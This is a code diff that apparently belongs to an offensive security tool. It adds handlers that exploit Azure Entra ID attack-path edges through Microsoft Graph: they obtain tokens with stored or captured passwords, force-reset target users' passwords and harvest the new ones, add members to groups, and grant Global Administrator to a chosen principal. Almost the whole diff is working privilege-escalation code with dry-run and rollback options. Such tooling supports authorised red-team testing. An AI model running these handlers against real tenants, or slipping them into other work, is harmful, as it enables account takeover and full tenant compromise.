@@ -55,6 +55,67 @@ class AzureBaseHandler(BaseEdgeHandler):
             roadtx_bin=az.roadtx_path,
         )
 
+    def _source_upn(self, edge: EdgeInfo) -> str | None:
+        """UPN of the edge's source principal (falls back to the config user)."""
+        az = self._azure_cfg()
+        name = edge.source.name if edge and edge.source else None
+        if name:
+            return name if "@" in name else (f"{name}@{az.tenant_domain}" if az else name)
+        return f"{az.username}@{az.tenant_domain}" if az else None
+
+    async def _user_token(self, edge: EdgeInfo) -> str | None:
+        """Delegated MS Graph token for the edge's **source user** (ROPC).
+
+        Password resolution order: ``-p source_password=``, then the config
+        credential when the source matches ``azure.username``, then a captured
+        password in the cred store (campaign chaining / vault). Placeholder
+        while emitting.
+        """
+        az = self._azure_cfg()
+        if az is None:
+            if emitting():
+                return await roadtx.get_graph_token(
+                    auth_mode="ropc", username="<USER>", password="<PASSWORD>",
+                    tenant="<TENANT>",
+                )
+            return None
+
+        user = (self._source_upn(edge) or az.username).split("@")[0]
+        pw = edge.properties.get("source_password")
+        mode = "ropc"
+        if pw is None and user.lower() == az.username.split("@")[0].lower():
+            pw, mode = az.password, az.auth_mode
+        if pw is None:
+            cred = self.cred_store.get_best_credential(user, az.tenant_domain)
+            if cred and cred.cred_type == CredentialType.password:
+                pw = cred.value
+        if pw is None and emitting():
+            pw = "<PASSWORD>"
+        if pw is None:
+            return None
+        return await roadtx.get_graph_token(
+            auth_mode=mode, username=user, password=pw, tenant=az.tenant_domain,
+            client_id=az.client_id, roadtx_bin=az.roadtx_path,
+        )
+
+    async def _grant_role(
+        self, token: str, role_def_id: str, principal_id: str
+    ) -> tuple[bool, str, str | None]:
+        """POST a directory role assignment; returns (ok, message, assignmentId)."""
+        res = await roadtx.graph_request(
+            "POST", "/roleManagement/directory/roleAssignments", token,
+            body={
+                "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
+                "roleDefinitionId": role_def_id,
+                "principalId": principal_id,
+                "directoryScopeId": "/",
+            },
+        )
+        if not res.get("success"):
+            return False, f"Role assignment failed: {res.get('error', 'unknown')}", None
+        aid = (res.get("parsed") or {}).get("id")
+        return True, f"Granted role {role_def_id} to {principal_id} (assignment {aid})", aid
+
     @staticmethod
     def _app_identifier(edge: EdgeInfo) -> str | None:
         """Best-effort appId/client-id for the target App/SP.
@@ -300,6 +361,193 @@ class AZMGGrantRoleHandler(AzureBaseHandler):
             step_index=0,
             action_type="azure_remove_role_assignment",
             description=f"Remove role assignment {aid} ({edge.target.name})",
+            command=f"roadtx graphrequest -m DELETE {url}",
+            reversible=True,
+        )
+
+
+@register_handler("AZResetPassword")
+class AZResetPasswordHandler(AzureBaseHandler):
+    """AZResetPassword: a password-reset-capable principal (Helpdesk / Password /
+    Authentication / User Administrator) resets a target user's password.
+
+    Graph: ``PATCH /users/{id}`` with a new passwordProfile. Irreversible
+    (original password unknown) so no rollback.
+    """
+
+    @staticmethod
+    def _new_password() -> str:
+        import secrets
+        import string
+
+        body = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(20))
+        return body + "Aa1!"
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        if edge.target.label != "AZUser":
+            return False, f"AZResetPassword needs an AZUser target, got {edge.target.label}"
+        if not (edge.properties.get("target_id") or edge.target.object_id):
+            return False, f"No object id for target user {edge.target.name}"
+        return True, f"{edge.source.name} can reset {edge.target.name}'s password"
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        az = self._azure_cfg()
+        tgt = edge.properties.get("target_id") or edge.target.object_id or None
+        if not tgt and emitting():
+            tgt = "<TARGET_OBJECT_ID>"
+        new_pw = "<NEW_PASSWORD>" if emitting() else self._new_password()
+
+        if dry_run:
+            return True, f"[DRY RUN] Would reset password of {edge.target.name}", []
+
+        token = await self._user_token(edge)
+        if not token:
+            return False, f"Failed to obtain Graph token for {edge.source.name}", []
+
+        res = await roadtx.graph_request(
+            "PATCH", f"/users/{tgt}", token,
+            body={"passwordProfile": {"forceChangePasswordNextSignIn": False, "password": new_pw}},
+        )
+        if not res.get("success"):
+            return False, f"Password reset failed: {res.get('error', 'unknown')}", []
+
+        cred = Credential(
+            cred_type=CredentialType.password,
+            value=new_pw,
+            username=edge.target.name.split("@")[0],
+            domain=az.tenant_domain if az else "<TENANT>",
+            obtained_from=f"AZResetPassword on {edge.target.name}",
+        )
+        return True, f"Reset password of {edge.target.name}", [cred]
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
+        return None  # irreversible — the original password is unknown
+
+
+@register_handler("AZAddMembers", "AZAddMember")
+class AZAddMembersHandler(AzureBaseHandler):
+    """AZAddMembers: a principal that can manage a group adds a member to it.
+
+    Graph: ``POST /groups/{id}/members/$ref``. Rollback removes the member.
+    Principal to add via ``-p add_principal=<objectId>``.
+    """
+
+    @staticmethod
+    def _principal(edge: EdgeInfo) -> str | None:
+        p = edge.properties.get("add_principal")
+        if not p and emitting():
+            p = "<PRINCIPAL_OBJECT_ID>"
+        return p
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        if edge.target.label != "AZGroup":
+            return False, f"AZAddMembers needs an AZGroup target, got {edge.target.label}"
+        if not (edge.properties.get("group_id") or edge.target.object_id):
+            return False, f"No object id for group {edge.target.name}"
+        if not self._principal(edge):
+            return False, "No principal to add — pass -p add_principal=<objectId>"
+        return True, f"{edge.source.name} can add members to {edge.target.name}"
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        gid = edge.properties.get("group_id") or edge.target.object_id or None
+        if not gid and emitting():
+            gid = "<GROUP_OBJECT_ID>"
+        pid = self._principal(edge)
+
+        if dry_run:
+            return True, f"[DRY RUN] Would add {pid} to group {edge.target.name}", []
+
+        token = await self._user_token(edge)
+        if not token:
+            return False, f"Failed to obtain Graph token for {edge.source.name}", []
+
+        res = await roadtx.graph_request(
+            "POST", f"/groups/{gid}/members/$ref", token,
+            body={"@odata.id": f"{roadtx.GRAPH_BASE}/directoryObjects/{pid}"},
+        )
+        if not res.get("success"):
+            return False, f"Add member failed: {res.get('error', 'unknown')}", []
+
+        self._last_gid, self._last_pid = gid, pid
+        return True, f"Added {pid} to group {edge.target.name}", []
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
+        gid = getattr(self, "_last_gid", None)
+        pid = getattr(self, "_last_pid", None)
+        if not gid or not pid:
+            return None
+        url = f"{roadtx.GRAPH_BASE}/groups/{gid}/members/{pid}/$ref"
+        return RollbackAction(
+            step_index=0,
+            action_type="azure_remove_group_member",
+            description=f"Remove {pid} from group {edge.target.name}",
+            command=f"roadtx graphrequest -m DELETE {url}",
+            reversible=True,
+        )
+
+
+@register_handler("AZPrivilegedRoleAdmin")
+class AZPrivilegedRoleAdminHandler(AzureBaseHandler):
+    """AZPrivilegedRoleAdmin: a user holding Privileged Role Administrator grants
+    a directory role (default Global Administrator) to a controlled principal.
+
+    Same Graph call as AZMGGrantRole but authenticated as the **user** (delegated)
+    rather than an SP. Role via ``-p role_definition_id=`` (default GA), principal
+    via ``-p promote=<objectId>``.
+    """
+
+    GLOBAL_ADMIN = "62e90394-69f5-4237-9190-012177145e10"
+
+    def _role_def(self, edge: EdgeInfo) -> str:
+        return edge.properties.get("role_definition_id") or self.GLOBAL_ADMIN
+
+    @staticmethod
+    def _promote(edge: EdgeInfo) -> str | None:
+        p = edge.properties.get("promote")
+        if not p and emitting():
+            p = "<PRINCIPAL_OBJECT_ID>"
+        return p
+
+    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
+        if not self._promote(edge):
+            return False, "No principal to promote — pass -p promote=<objectId>"
+        return True, (
+            f"{edge.source.name} (Privileged Role Admin) can grant role "
+            f"{self._role_def(edge)} to {self._promote(edge)}"
+        )
+
+    async def exploit(
+        self, edge: EdgeInfo, dry_run: bool = False
+    ) -> tuple[bool, str, list[Credential]]:
+        role = self._role_def(edge)
+        pid = self._promote(edge)
+
+        if dry_run:
+            return True, f"[DRY RUN] Would grant role {role} to {pid}", []
+
+        token = await self._user_token(edge)
+        if not token:
+            return False, f"Failed to obtain Graph token for {edge.source.name}", []
+
+        ok, msg, aid = await self._grant_role(token, role, pid)
+        if not ok:
+            return False, msg, []
+        self._last_assignment_id = aid
+        return True, msg, []
+
+    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
+        aid = getattr(self, "_last_assignment_id", None)
+        if not aid:
+            return None
+        url = f"{roadtx.GRAPH_BASE}/roleManagement/directory/roleAssignments/{aid}"
+        return RollbackAction(
+            step_index=0,
+            action_type="azure_remove_role_assignment",
+            description=f"Remove role assignment {aid}",
             command=f"roadtx graphrequest -m DELETE {url}",
             reversible=True,
         )
